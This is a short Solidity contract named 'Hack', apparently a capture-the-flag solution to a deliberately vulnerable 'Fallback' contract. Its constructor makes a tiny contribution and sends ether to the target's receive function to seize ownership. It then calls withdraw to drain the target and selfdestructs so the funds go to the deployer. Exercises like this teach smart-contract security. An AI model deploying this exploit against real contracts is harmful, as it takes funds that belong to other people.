pragma solidity ^0.8;

interface IFallback {
    function owner() external view returns (address);
    function contributions(address) external view returns (uint256);
    function contribute() external payable;
    function withdraw() external;
}

contract Hack {
    IFallback private immutable target;

    // withdraw
    // call withdraw()

    // Take ownership
    // Call receive() to be owner
    // contribution > 0 to call receive()
    // call contribute() with < 0.001 ether

    constructor(address _target) payable {
        target = IFallback(_target);

        // Call contribute() with < 0.001 ether
        target.contribute{value: 1}();
        // Call receive() to be owner
        (bool ok,) = address(target).call{value: 1}("");
        require(ok, "send failed");

        target.withdraw();

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
